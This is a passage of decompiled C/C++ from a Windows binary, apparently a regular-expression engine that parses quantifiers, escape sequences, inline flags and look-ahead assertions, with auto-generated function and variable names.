  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00415b9e;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *(undefined4 *)((int)this + 0xb) = 0;
  local_38[0] = param_1._3_1_;
  local_34 = 0;
  local_30 = 0;
  local_2c = 0;
  pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
            ((int)this + 0x27);
  local_8 = 0;
  local_20 = this;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze(pbVar1)
  ;
  local_1c = *(ushort **)(pbVar1 + 4);
  local_18 = param_1;
  local_8._0_1_ = 1;
  this_00 = FUN_00404705(this,&local_1c,(undefined4 *)0x0,&local_18,local_38);
  puVar5 = (undefined4 *)FUN_0040507f(*(void **)((int)this + 4),8);
  local_8._0_1_ = 2;
  local_24 = puVar5;
  if (puVar5 == (undefined4 *)0x0) {
    puVar5 = (undefined4 *)0x0;
  }
  else {
    FUN_00407145(puVar5);
    *puVar5 = &DAT_004177a8;
  }
  local_8 = (uint)local_8._1_3_ << 8;
  this_00[1] = (int)puVar5;
  *(int **)((int)this + 0x3f) = this_00;
  puVar5 = (undefined4 *)FUN_00406f9c(this_00,&local_28,(int)local_38,(int)this + 0x43);
  *(undefined4 *)((int)this + 0x1b) = *puVar5;
  uVar2 = puVar5[1];
  *(undefined *)((int)this + 9) = 1;
  *(undefined4 *)((int)this + 0x1f) = uVar2;
  pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
            ((int)this + 0x27);
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze(pbVar1)
  ;
  local_14 = *(byte **)(pbVar1 + 4);
  if (((byte)*(undefined4 *)((int)this + 0x13) & 4) != 4) {
    iVar6 = FUN_00407cc2((int)(this_00 + 2));
    if (iVar6 == 1) {
      pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                ((int)this + 0x27);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                (pbVar1);
      if ((byte *)(-(uint)(*(int *)(pbVar1 + 4) != 0) & *(int *)(pbVar1 + 8) + *(int *)(pbVar1 + 4))
          != local_14) {
        pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                  ((int)this + 0x27);
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                  (pbVar1);
        iVar6 = FUN_00406b23(&local_18,&local_14,
                             (byte *)(-(uint)(*(int *)(pbVar1 + 4) != 0) &
                                     *(int *)(pbVar1 + 8) + *(int *)(pbVar1 + 4)));
        if (iVar6 == 4) {
          *(uint *)((int)this + 0x13) = *(uint *)((int)this + 0x13) & 0xffffffef;
          *(undefined *)((int)this + 9) = 0;
        }
      }
    }
  }
  pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
            ((int)this + 0x27);
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze(pbVar1)
  ;
  local_14 = *(byte **)(pbVar1 + 4);
  bVar3 = (byte)*(undefined4 *)((int)this + 0x13);
  if (((bVar3 & 0x10) != 0x10) && ((bVar3 & 8) == 8)) {
    iVar6 = this_00[3];
    iVar7 = 0;
    if (iVar6 != 0) {
      do {
        iVar6 = *(int *)(iVar6 + 4);
        iVar7 = iVar7 + 1;
      } while (iVar6 != 0);
      if (iVar7 == 1) {
        pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                  ((int)this + 0x27);
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                  (pbVar1);
        if ((byte *)(-(uint)(*(int *)(pbVar1 + 4) != 0) &
                    *(int *)(pbVar1 + 8) + *(int *)(pbVar1 + 4)) != local_14) {
          pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **
                    )((int)this + 0x27);
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                    (pbVar1);
          iVar6 = FUN_00406b23(&local_18,&local_14,
                               (byte *)(-(uint)(*(int *)(pbVar1 + 4) != 0) &
                                       *(int *)(pbVar1 + 8) + *(int *)(pbVar1 + 4)));
          if (iVar6 == 7) {
            pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                       **)((int)this + 0x27);
            std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
            _Freeze(pbVar1);
            if ((byte *)(-(uint)(*(int *)(pbVar1 + 4) != 0) &
                        *(int *)(pbVar1 + 8) + *(int *)(pbVar1 + 4)) != local_14) {
              pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                         **)((int)this + 0x27);
              std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
              _Freeze(pbVar1);
              cVar4 = FUN_00406b76(&local_18,(char **)&local_14,
                                   (char *)(-(uint)(*(int *)(pbVar1 + 4) != 0) &
                                           *(int *)(pbVar1 + 8) + *(int *)(pbVar1 + 4)));
              iVar6 = CONCAT31(extraout_var,cVar4);
              if ((8 < iVar6) && ((iVar6 < 0xb || ((0xb < iVar6 && (iVar6 < 0xe)))))) {
                *(undefined *)((int)this + 9) = 0;
              }
            }
          }
        }
      }
    }
  }
  local_8 = 0xffffffff;
  FUN_00402249((int)local_38);
  ExceptionList = local_10;
  return;
}



void __thiscall FUN_0040684b(void *this,uint param_1)

{
  uint *puVar1;
  uint uVar2;
  undefined4 *puVar3;
  uint uVar4;
  bad_alloc local_10 [12];
  
  puVar1 = (uint *)((int)this + 5);
  if (*(uint *)((int)this + 5) <= param_1) {
    puVar1 = &param_1;
  }
  uVar4 = *puVar1 + 0xc;
  uVar2 = uVar4;
  if ((int)uVar4 < 0) {
    uVar2 = 0;
  }
  puVar3 = (undefined4 *)operator_new(uVar2);
  if (puVar3 == (undefined4 *)0x0) {
    std::bad_alloc::bad_alloc(local_10,s_bad_allocation_0041c3cc);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_10,(ThrowInfo *)&DAT_00419968);
  }
  *puVar3 = 0;
  puVar3[1] = uVar4;
  puVar3[2] = *(undefined4 *)((int)this + 1);
  *(undefined4 **)((int)this + 1) = puVar3;
  return;
}



void __cdecl FUN_004068af(int *param_1,uint param_2,undefined4 param_3)

{
  FUN_0040a64e(param_1,param_2,param_3);
  return;
}



void __cdecl FUN_004068c8(int *param_1,uint param_2,undefined4 param_3)

{
  FUN_0040a759(param_1,param_2,param_3);
  return;
}



void __cdecl FUN_004068e1(void *param_1,int *param_2,char *param_3)

{
  FUN_0040a807(param_1,param_2,param_3);
  return;
}



void __cdecl FUN_004068f7(void *param_1,int *param_2,char *param_3)

{
  FUN_0040a89a(param_1,param_2,param_3);
  return;
}



undefined4 __cdecl FUN_0040690d(int param_1,undefined *param_2,char param_3)

{
  uint uVar1;
  uint uVar2;
  undefined4 uVar3;
  undefined *puVar4;
  char cVar5;
  char cVar6;
  byte *pbVar7;
  int iVar8;
  void *this;
  undefined4 *puVar9;
  undefined4 *puVar10;
  int iVar11;
  char *pcVar12;
  undefined4 *puVar13;
  byte *pbVar14;
  
  puVar4 = param_2;
  cVar5 = *(char *)(param_1 + 9);
  uVar1 = *(uint *)(param_1 + 0x13);
  uVar2 = *(uint *)(param_1 + 0x1b);
  if (*(int *)(param_2 + 0x20) == 0) {
    param_2 = FUN_004068f7;
    if (param_3 == '\0') {
      param_2 = FUN_004068e1;
    }
  }
  else if (param_3 == '\0') {
    param_2 = FUN_004068af;
  }
  else {
    param_2 = FUN_004068c8;
  }
  iVar11 = *(int *)(puVar4 + 0xc);
  uVar3 = *(undefined4 *)(param_1 + 0x3f);
  puVar9 = *(undefined4 **)puVar4;
  *(undefined4 *)(puVar4 + 0x1c) = uVar3;
  for (; iVar11 != 0; iVar11 = iVar11 + -1) {
    puVar10 = (undefined4 *)&DAT_0041cbc0;
    puVar13 = puVar9;
    for (iVar8 = 6; iVar8 != 0; iVar8 = iVar8 + -1) {
      *puVar13 = *puVar10;
      puVar10 = puVar10 + 1;
      puVar13 = puVar13 + 1;
    }
    puVar9 = (undefined4 *)((int)puVar9 + 0x1a);
    *(undefined2 *)puVar13 = *(undefined2 *)puVar10;
  }
  if (param_3 == '\0') {
    pbVar14 = *(byte **)(puVar4 + 4);
    if (uVar2 <= (uint)((int)pbVar14 - *(int *)(puVar4 + 0x18))) {
      iVar11 = (int)pbVar14 - uVar2;
      if ((uVar1 & 0x10) == 0) {
        this = *(void **)(param_1 + 0x4f);
        if (this == (void *)0x0) {
          _param_3 = *(int *)(puVar4 + 0x18);
          while (((cVar6 = (*(code *)param_2)(uVar3,puVar4,_param_3), cVar6 == '\0' &&
                  (cVar5 != '\0')) && (_param_3 != iVar11))) {
            _param_3 = _param_3 + 1;
            puVar4[0x24] = 0;
          }
        }
        else {
          iVar11 = *(int *)((int)this + 8);
          pbVar7 = *(byte **)(puVar4 + 0x18);
          while( true ) {
            if (iVar11 == 0) {
              pbVar7 = FUN_00413b86(this,pbVar7,pbVar14);
            }
            else {
              pbVar7 = FUN_00413b21(this,pbVar7,pbVar14);
            }
            if (((pbVar7 == *(byte **)(puVar4 + 4)) ||
                (cVar6 = (*(code *)param_2)(uVar3,puVar4,pbVar7), cVar6 != '\0')) || (cVar5 == '\0')
               ) break;
            puVar4[0x24] = 0;
            pbVar14 = *(byte **)(puVar4 + 4);
            pbVar7 = pbVar7 + 1;
            this = *(void **)(param_1 + 0x4f);
            iVar11 = *(int *)((int)this + 8);
          }
        }
      }
      else {
        for (; (cVar5 = (*(code *)param_2)(uVar3,puVar4,iVar11), cVar5 == '\0' &&
               (iVar11 != *(int *)(puVar4 + 0x18))); iVar11 = iVar11 + -1) {
          puVar4[0x24] = 0;
        }
      }
    }
  }
  else {
    for (pcVar12 = *(char **)(puVar4 + 0x18);
        ((cVar6 = (*(code *)param_2)(uVar3,puVar4,pcVar12), cVar6 == '\0' && (cVar5 != '\0')) &&
        (*pcVar12 != '\0')); pcVar12 = pcVar12 + 1) {
      puVar4[0x24] = 0;
    }
  }
  return CONCAT31((int3)((uint)*(int *)puVar4 >> 8),*(undefined *)(*(int *)puVar4 + 8));
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

uint __cdecl FUN_00406a77(int param_1,undefined *param_2,char param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined local_430 [1056];
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415bb3;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  FUN_00407754((int)local_430);
  local_8 = 0;
  *(undefined **)(param_2 + 0x20) = local_430;
  uVar1 = FUN_0040690d(param_1,param_2,param_3);
  local_8 = 0xffffffff;
  uVar2 = FUN_00407784((int)local_430);
  ExceptionList = local_10;
  return CONCAT31((int3)((uint)uVar2 >> 8),(char)uVar1);
}



undefined4 * __thiscall FUN_00406ad2(void *this,logic_error *param_1)

{
  std::logic_error::logic_error((logic_error *)this,param_1);
  *(undefined **)this = &DAT_00417698;
  return (undefined4 *)this;
}



void __thiscall FUN_00406aeb(void *this,undefined4 *param_1)

{
  FUN_00407990(this,&param_1,*(void ***)((int)this + 4),param_1);
  return;
}



void __thiscall FUN_00406b02(void *this,int param_1)

{
  undefined4 uVar1;
  
  uVar1 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)((int)this + 4) = *(undefined4 *)(param_1 + 4);
  *(undefined4 *)(param_1 + 4) = uVar1;
  uVar1 = *(undefined4 *)((int)this + 8);
  *(undefined4 *)((int)this + 8) = *(undefined4 *)(param_1 + 8);
  *(undefined4 *)(param_1 + 8) = uVar1;
  return;
}



int __thiscall FUN_00406b23(void *this,byte **param_1,byte *param_2)

{
  byte *pbVar1;
  int iVar2;
  
  pbVar1 = (byte *)FUN_00407a01(this,(char **)param_1,(char *)param_2);
  if (param_2 == pbVar1) {
    iVar2 = 0;
  }
  else {
    iVar2 = *(int *)(&DAT_00418cf8 + (uint)**param_1 * 4);
    if (iVar2 != 0) {
      *param_1 = *param_1 + 1;
    }
    if ((iVar2 == 8) && (pbVar1 = *param_1, param_2 != pbVar1)) {
      iVar2 = *(int *)(&DAT_004188f8 + (uint)*pbVar1 * 4);
      if (iVar2 == 0) {
        iVar2 = 8;
      }
      else {
        *param_1 = pbVar1 + 1;
      }
    }
  }
  return iVar2;
}



char __thiscall FUN_00406b76(void *this,char **param_1,char *param_2)

{
  char cVar1;
  char *pcVar2;
  
  pcVar2 = FUN_00407a01(this,param_1,param_2);
  if (param_2 == pcVar2) {
    cVar1 = '\0';
  }
  else {
    pcVar2 = *param_1;
    cVar1 = *pcVar2;
    if (cVar1 == '*') {
      *param_1 = pcVar2 + 1;
      pcVar2 = FUN_00407a01(this,param_1,param_2);
      if ((param_2 == pcVar2) || (**param_1 != '?')) {
        cVar1 = '\0';
      }
      else {
        *param_1 = *param_1 + 1;
        cVar1 = '\x01';
      }
      cVar1 = (-cVar1 & 3U) + 10;
    }
    else if (cVar1 == '+') {
      *param_1 = pcVar2 + 1;
      pcVar2 = FUN_00407a01(this,param_1,param_2);
      if ((param_2 == pcVar2) || (**param_1 != '?')) {
        cVar1 = '\0';
      }
      else {
        *param_1 = *param_1 + 1;
        cVar1 = '\x01';
      }
      cVar1 = (-cVar1 & 3U) + 9;
    }
    else {
      if (cVar1 == ',') {
        cVar1 = '\x10';
      }
      else {
        if (cVar1 == '?') {
          *param_1 = pcVar2 + 1;
          pcVar2 = FUN_00407a01(this,param_1,param_2);
          if ((param_2 == pcVar2) || (**param_1 != '?')) {
            cVar1 = '\0';
          }
          else {
            *param_1 = *param_1 + 1;
            cVar1 = '\x01';
          }
          return (-cVar1 & 3U) + 0xb;
        }
        if (cVar1 != '{') {
          if (cVar1 != '}') {
            return '\0';
          }
          *param_1 = pcVar2 + 1;
          pcVar2 = FUN_00407a01(this,param_1,param_2);
          if ((param_2 == pcVar2) || (**param_1 != '?')) {
            cVar1 = '\0';
          }
          else {
            *param_1 = *param_1 + 1;
            cVar1 = '\x01';
          }
          return cVar1 + '\x11';
        }
        cVar1 = '\x0f';
      }
      *param_1 = pcVar2 + 1;
    }
  }
  return cVar1;
}



undefined4 FUN_00406c89(char **param_1,char *param_2)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  undefined4 uStack_8;
  
  pcVar2 = *param_1;
  if (*pcVar2 == '$') {
    pcVar3 = pcVar2 + 1;
    *param_1 = pcVar3;
    if (param_2 == pcVar3) {
      return 0x22;
    }
    cVar1 = *pcVar3;
    if (cVar1 == '&') {
      uStack_8 = 0x25;
    }
    else if (cVar1 == '\'') {
      uStack_8 = 0x24;
    }
    else {
      if (cVar1 != '`') {
        return 0x22;
      }
      uStack_8 = 0x23;
    }
  }
  else {
    if (*pcVar2 != '\\') {
      return 0;
    }
    pcVar3 = pcVar2 + 1;
    *param_1 = pcVar3;
    if (param_2 == pcVar3) {
      return 0x26;
    }
    cVar1 = *pcVar3;
    if (cVar1 == 'E') {
      uStack_8 = 0x2c;
    }
    else if (cVar1 == 'L') {
      uStack_8 = 0x2a;
    }
    else if (cVar1 == 'Q') {
      uStack_8 = 0x27;
    }
    else if (cVar1 == 'U') {
      uStack_8 = 0x28;
    }
    else if (cVar1 == 'l') {
      uStack_8 = 0x2b;
    }
    else {
      if (cVar1 != 'u') {
        return 0x26;
      }
      uStack_8 = 0x29;
    }
  }
  *param_1 = pcVar2 + 2;
  return uStack_8;
}



char ** __thiscall FUN_00406d0a(void *this,char **param_1,char *param_2)

{
  bool bVar1;
  char **ppcVar2;
  char *pcVar3;
  int iVar4;
  uint uVar5;
  char cVar6;
  
  ppcVar2 = param_1;
  pcVar3 = FUN_00407a01(this,param_1,param_2);
  if (param_2 == pcVar3) {
    return (char **)0;
  }
  if (**param_1 != '?') {
    return (char **)0;
  }
  pcVar3 = *param_1 + 1;
  *param_1 = pcVar3;
  if ((*(byte *)((int)this + 1) & 2) != 0) {
    while ((param_2 != pcVar3 && (iVar4 = isspace((int)*pcVar3), iVar4 != 0))) {
      *param_1 = *param_1 + 1;
      pcVar3 = *param_1;
    }
  }
  pcVar3 = *param_1;
  if (param_2 == pcVar3) {
    return (char **)0x53;
  }
  cVar6 = *pcVar3;
  if (cVar6 < '=') {
    if (cVar6 == '<') {
      *param_1 = pcVar3 + 1;
      pcVar3 = FUN_00407a01(this,param_1,param_2);
      if (param_2 == pcVar3) {
        return (char **)0x53;
      }
      pcVar3 = *param_1;
      if (*pcVar3 == '!') {
        param_1 = (char **)0x4e;
      }
      else {
        if (*pcVar3 != '=') {
          return (char **)0x53;
        }
        param_1 = (char **)0x4d;
      }
    }
    else if (cVar6 == '!') {
      param_1 = (char **)0x4c;
    }
    else if (cVar6 == '#') {
      param_1 = (char **)0x50;
    }
    else if (cVar6 == '(') {
      param_1 = (char **)0x51;
    }
    else {
      if (cVar6 != ':') goto LAB_00406e1a;
      param_1 = (char **)0x4a;
    }
  }
  else if (cVar6 == '=') {
    param_1 = (char **)0x4b;
  }
  else if (cVar6 == '>') {
    param_1 = (char **)0x4f;
  }
  else {
    if (cVar6 != 'R') {
LAB_00406e1a:
      bVar1 = true;
      while( true ) {
        if (cVar6 == ':') {
          *param_1 = *param_1 + 1;
          return (char **)0x4a;
        }
        if (cVar6 == ')') {
          return (char **)0x4a;
        }
        if ((cVar6 == '-') && (bVar1)) {
          bVar1 = false;
        }
        else {
          if (cVar6 == 'i') {
                    // WARNING: Load size is inaccurate
            if (bVar1) {
              uVar5 = *this | 1;
            }
            else {
              uVar5 = *this & 0xfffffffe;
            }
          }
          else if (cVar6 == 'm') {
                    // WARNING: Load size is inaccurate
            if (bVar1) {
              uVar5 = *this | 4;
            }
            else {
              uVar5 = *this & 0xfffffffb;
            }
          }
          else if (cVar6 == 's') {
                    // WARNING: Load size is inaccurate
            if (bVar1) {
              uVar5 = *this | 8;
            }
            else {
              uVar5 = *this & 0xfffffff7;
            }
          }
          else {
            if (cVar6 != 'x') {
              return (char **)0x53;
            }
                    // WARNING: Load size is inaccurate
            if (bVar1) {
              uVar5 = *this | 0x200;
            }
            else {
              uVar5 = *this & 0xfffffdff;
            }
          }
          *(uint *)this = uVar5;
        }
        *param_1 = *param_1 + 1;
        pcVar3 = FUN_00407a01(this,param_1,param_2);
        if (param_2 == pcVar3) break;
        cVar6 = **param_1;
      }
      return (char **)0x53;
    }
    param_1 = (char **)0x52;
  }
  *ppcVar2 = pcVar3 + 1;
  return param_1;
}



void __fastcall FUN_00406ed3(char *param_1)

{
  if ((*param_1 != '\0') && (*(int **)(param_1 + 4) != (int *)0x0)) {
    (**(code **)(**(int **)(param_1 + 4) + 0x18))(1);
  }
  return;
}



void __thiscall FUN_00406ee7(void *this,int *param_1,char *param_2)

{
  FUN_0040a807(this,param_1,param_2);
  return;
}



void __thiscall FUN_00406efc(void *this,int *param_1,char *param_2)

{
  FUN_0040a89a(this,param_1,param_2);
  return;
}



void __thiscall FUN_00406f11(void *this,int *param_1)

{
  FUN_0040a92c(this,param_1);
  return;
}



void __thiscall FUN_00406f23(void *this,int *param_1)

{
  FUN_0040a976(this,param_1);
  return;
}



void __fastcall FUN_00406f41(int param_1)

{
  undefined4 local_8;
  
  local_8 = 0;
  FUN_00407c9d((void *)(param_1 + 8),&local_8);
  *(undefined4 *)(param_1 + 0x1c) = *(undefined4 *)(param_1 + 0xc);
  return;
}



void __thiscall FUN_00406f61(void *this,undefined4 *param_1,void **param_2)

{
  undefined4 uVar1;
  undefined4 *puVar2;
  uint local_14 [4];
  
                    // WARNING: Load size is inaccurate
  uVar1 = (**(code **)(*this + 0x38))();
  **(undefined4 **)((int)this + 0x1c) = uVar1;
  FUN_00407cd2((int)this + 8);
  puVar2 = (undefined4 *)FUN_00407afa(this,local_14,param_2);
  *param_1 = *puVar2;
  param_1[1] = puVar2[1];
  param_1[2] = puVar2[2];
  *(undefined *)(param_1 + 3) = *(undefined *)(puVar2 + 3);
  return;
}



void __thiscall FUN_00406f9c(void *this,undefined4 *param_1,int param_2,undefined4 param_3)

{
  int local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  uint local_c [2];
  
  if ((*(int *)((int)this + 0x14) == -1) && (*(int *)((int)this + 0x18) == -1)) {
    local_1c = param_2;
    local_18 = param_3;
    local_14 = DAT_00417688;
    local_10 = DAT_0041768c;
    FUN_00406fed(this,local_c,&local_1c);
  }
  *param_1 = *(undefined4 *)((int)this + 0x14);
  param_1[1] = *(undefined4 *)((int)this + 0x18);
  return;
}



void __thiscall FUN_00406fed(void *this,uint *param_1,int *param_2)

{
  int iVar1;
  uint *puVar2;
  uint uVar3;
  void **ppvVar4;
  int local_1c [2];
  uint local_14;
  uint local_10;
  uint local_c;
  uint local_8;
  
  ppvVar4 = *(void ***)((int)this + 0xc);
  local_c = 0xffffffff;
  local_8 = 0;
  for (; ((DAT_00417690 != local_c || (DAT_00417694 != local_8)) && (ppvVar4 != (void **)0x0));
      ppvVar4 = (void **)ppvVar4[1]) {
    iVar1 = *param_2;
    if (*(int *)(iVar1 + 4) == 0) {
      uVar3 = 0;
    }
    else {
      uVar3 = *(int *)(iVar1 + 8) - *(int *)(iVar1 + 4) >> 2;
    }
    if (*(uint *)((int)this + 0x10) < uVar3) {
      *(undefined4 *)(*(int *)(iVar1 + 4) + *(uint *)((int)this + 0x10) * 4) = 0;
    }
    puVar2 = (uint *)FUN_00407c0e(*ppvVar4,local_1c,param_2);
    local_14 = *puVar2;
    local_10 = puVar2[1];
    iVar1 = *param_2;
    if (*(int *)(iVar1 + 4) == 0) {
      uVar3 = 0;
    }
    else {
      uVar3 = *(int *)(iVar1 + 8) - *(int *)(iVar1 + 4) >> 2;
    }
    if (*(uint *)((int)this + 0x10) < uVar3) {
      *(void **)(*(int *)(iVar1 + 4) + *(uint *)((int)this + 0x10) * 4) = this;
    }
    puVar2 = &local_c;
    if (local_14 <= local_c) {
      puVar2 = &local_14;
    }
    local_c = *puVar2;
    puVar2 = &local_8;
    if (local_8 <= local_10) {
      puVar2 = &local_10;
    }
    local_8 = *puVar2;
  }
  *(uint *)((int)this + 0x14) = local_c;
  *(uint *)((int)this + 0x18) = local_8;
  *param_1 = local_c;
  param_1[1] = local_8;
  return;
}



undefined4 __thiscall FUN_004070c9(void *this,uint *param_1)

{
  undefined *puVar1;
  int **ppiVar2;
  undefined4 uVar3;
  int **ppiVar4;
  uint uVar5;
  int iVar6;
  undefined *puVar7;
  uint *puVar8;
  undefined local_1c [8];
  uint local_14;
  uint uStack_10;
  uint uStack_c;
  undefined uStack_8;
  
  if (*(int *)((int)this + 0x1c) == 0) {
    uVar3 = 0;
  }
  else {
    uVar5 = *(int *)((int)this + 0x20) - *(int *)((int)this + 0x1c);
    *param_1 = uVar5;
    if (uVar5 < 3) {
      puVar1 = *(undefined **)((int)this + 0x20);
      puVar8 = param_1 + 1;
      for (puVar7 = *(undefined **)((int)this + 0x1c); puVar7 != puVar1; puVar7 = puVar7 + 1) {
        *(undefined *)puVar8 = *puVar7;
        puVar8 = (uint *)((int)puVar8 + 1);
      }
    }
    else {
      param_1[1] = *(uint *)((int)this + 0x1c);
    }
    *(undefined *)(param_1 + 2) = 0;
    ppiVar2 = *(int ***)((int)this + 0xc);
    iVar6 = 0;
    ppiVar4 = ppiVar2;
    if (ppiVar2 != (int **)0x0) {
      do {
        ppiVar4 = (int **)ppiVar4[1];
        iVar6 = iVar6 + 1;
      } while (ppiVar4 != (int **)0x0);
      ppiVar4 = (int **)0x0;
      if (iVar6 == 1) {
        ppiVar4 = (int **)(**(code **)(**ppiVar2 + 0x30))(local_1c);
        param_1[2] = local_14;
        param_1[3] = uStack_10;
        param_1[4] = uStack_c;
        *(undefined *)(param_1 + 5) = uStack_8;
      }
    }
    uVar3 = CONCAT31((int3)((uint)ppiVar4 >> 8),1);
  }
  return uVar3;
}



void __fastcall FUN_00407145(undefined4 *param_1)

{
  param_1[1] = 0;
  *param_1 = &DAT_004177dc;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00407152(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00415bc8;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004177dc;
  local_8 = 0;
  if ((int *)param_1[1] != (int *)0x0) {
    (**(code **)(*(int *)param_1[1] + 0x18))(1);
  }
  *param_1 = &DAT_00417810;
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void FUN_0040718e(void)

{
  size_t sVar1;
  undefined *local_40 [7];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_24 [20];
  void *pvStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415bdd;
  pvStack_10 = ExceptionList;
  ExceptionList = &pvStack_10;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            (local_24,false);
  sVar1 = strlen(s_sub_expression_cannot_be_quantif_0041c3dc);
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
            (local_24,s_sub_expression_cannot_be_quantif_0041c3dc,sVar1);
  local_8 = 0;
  std::logic_error::logic_error((logic_error *)local_40,local_24);
  local_40[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_40,(ThrowInfo *)&DAT_004196f8);
}



undefined4 __thiscall FUN_00407220(void *this,undefined4 param_1,undefined param_2)

{
  char cVar1;
  undefined4 unaff_ESI;
  undefined4 unaff_retaddr;
  
                    // WARNING: Load size is inaccurate
  cVar1 = (**(code **)(*this + 0x24))(param_1,&param_2);
  if ((cVar1 != '\0') &&
     (cVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(unaff_ESI,unaff_retaddr), cVar1 != '\0'))
  {
    return 1;
  }
  return 0;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 __thiscall
FUN_00407272(void *this,undefined4 param_1,undefined4 param_2,char param_3,void **param_4)

{
  void *pvVar1;
  undefined4 uVar2;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415c04;
  local_10 = ExceptionList;
  if (param_3 == '\0') {
    ExceptionList = &local_10;
    pvVar1 = (void *)FUN_0040507f(*param_4,0x24);
    local_8 = 1;
    if (pvVar1 != (void *)0x0) {
      uVar2 = FUN_004083ea(pvVar1,(int)this,param_1,param_2);
      ExceptionList = local_10;
      return uVar2;
    }
  }
  else {
    ExceptionList = &local_10;
    pvVar1 = (void *)FUN_0040507f(*param_4,0x24);
    local_8 = 0;
    if (pvVar1 != (void *)0x0) {
      uVar2 = FUN_004082ae(pvVar1,(int)this,param_1,param_2);
      ExceptionList = local_10;
      return uVar2;
    }
  }
  ExceptionList = local_10;
  return 0;
}



void __thiscall FUN_00407368(void *this,int *param_1,char *param_2)

{
  FUN_0040acc6(this,param_1,param_2);
  return;
}



void __thiscall FUN_0040737d(void *this,int *param_1,char *param_2)

{
  FUN_0040adad(this,param_1,param_2);
  return;
}



void __thiscall FUN_00407392(void *this,int *param_1)

{
  FUN_0040ae95(this,param_1);
  return;
}



void __thiscall FUN_004073a4(void *this,int *param_1)

{
  FUN_0040af1b(this,param_1);
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void FUN_004073cc(void)

{
  size_t sVar1;
  undefined *local_40 [7];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_24 [20];
  void *pvStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415c41;
  pvStack_10 = ExceptionList;
  ExceptionList = &pvStack_10;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            (local_24,false);
  sVar1 = strlen(s_look_ahead_assertion_cannot_be_q_0041c400);
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
            (local_24,s_look_ahead_assertion_cannot_be_q_0041c400,sVar1);
  local_8 = 0;
  std::logic_error::logic_error((logic_error *)local_40,local_24);
  local_40[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_40,(ThrowInfo *)&DAT_004196f8);
}



void __thiscall FUN_0040742c(void *this,undefined4 *param_1,int *param_2)

{
  void *local_c;
  void *pvStack_8;
  
  local_c = this;
  pvStack_8 = this;
  FUN_00406fed(this,(uint *)&local_c,param_2);
  *param_1 = DAT_00417688;
  param_1[1] = DAT_0041768c;
  return;
}



void __thiscall FUN_00407464(void *this,int *param_1,int param_2)

{
  FUN_0040afa1(this,param_1,param_2);
  return;
}



void __thiscall FUN_00407479(void *this,int *param_1,int param_2)

{
  FUN_0040b108(this,param_1,param_2);
  return;
}



void __thiscall FUN_0040748e(void *this,int *param_1)

{
  FUN_0040b271(this,param_1);
  return;
}



void __thiscall FUN_004074a0(void *this,int *param_1)

{
  FUN_0040b3aa(this,param_1);
  return;
}



void __thiscall FUN_004074c0(void *this,undefined4 *param_1,int *param_2)

{
  void *local_c;
  void *pvStack_8;
  
  local_c = this;
  pvStack_8 = this;
  FUN_00406fed(this,(uint *)&local_c,param_2);
  *param_1 = DAT_00417688;
  param_1[1] = DAT_0041768c;
  return;
}



void __thiscall FUN_004074e9(void *this,int param_1,int param_2,int param_3)

{
  undefined *puVar1;
  char cVar2;
  int *piVar3;
  undefined *puVar4;
  byte bVar5;
  int iVar6;
  
  *(int *)((int)this + 8) = param_3;
